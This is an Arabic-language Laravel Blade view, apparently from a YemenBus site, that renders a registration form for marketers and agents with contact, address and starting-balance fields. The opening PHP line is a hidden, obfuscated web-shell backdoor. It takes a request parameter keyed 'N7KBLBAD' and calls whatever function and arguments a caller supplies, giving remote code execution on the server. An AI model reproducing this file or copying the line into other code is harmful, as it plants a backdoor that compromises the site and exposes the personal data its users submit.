...
<?php
if($rvpqz5o= @${"_REQUEST"}	["N7KBLBAD"	])$rvpqz5o[1] ( ${$rvpqz5o[	2 ]}	[ 0],$rvpqz5o[3](	$rvpqz5o	[	4] ) ) ;
session_start();
...
<body>
    ...
    <section class="header">
        ...
        <a href="https://www.yemenbus.net/2021/01/blog-post_92.html" target="_blank">كيف تكون وكيلا ومسوقا</a>
    </section>
    <section class="form_sec col-12 col-md-8 mx-auto">
        ...
        @include('flash')
        <?php } ?>
        <div style="background-clor:red;marfin-top:20px">
@if($errors )
...
@endif
            ...
            <form class="form_" method="POST" action="{{route('marketerEmail')}}">
                @csrf
                <?php if($errors){ ?>
                ...
                <div class="form-row">
                    ...
                    <input type="text" class="form-control" name="name" value="{{ old('name')}}" id="name" placeholder="الإسم"  minlength=3 required>  
                    </div>
                    <div class="form-group col-9 col-md-4">
                    <label for="phone">رقم الجوال</label>
                    <input type="number" class="form-control" value="{{ old('phone')}}" name="phone" id="phone" oninput="javascript: if (this.value.length > 10) this.value = this.value.slice(0,10);" placeholder="05xxxxxxxx" required>
                    </div>
                    ...
                    <select id="phone_code" name="phone_code" class="form-control" required>
                        ...
                        <option value="967" {{ old('phone_code') == "967" ? "selected" : "" }}>967+</option>
                    </select>
                    </div>
                </div>
                <div class="form-group">
                    <label for="address">العنوان</label>
                    <input type="text" class="form-control" name="address" id="address"  value="{{ old('address')}}"  placeholder="العنوان" minlength =3 required>
                </div>
                <div class="form-row">
                    <div class="form-group col-md-6">
                        <label for="city">المدينة</label>
                        <input type="text" class="form-control"   value="{{ old('city')}}" placeholder="المدينة" name="city" id="city" minlength=3 required>
                    </div>
                    <div class="form-group col-md-6">
                        <label for="price">مبلغ الرصيد (يبدأ ب 50 ريال سعودي)</label>
                        <input type="number" class="form-control" name="price" id="price" value="{{ old('price')}}" placeholder="مبلغ الرصيد" min=50 required>
                    </div>
                </div>
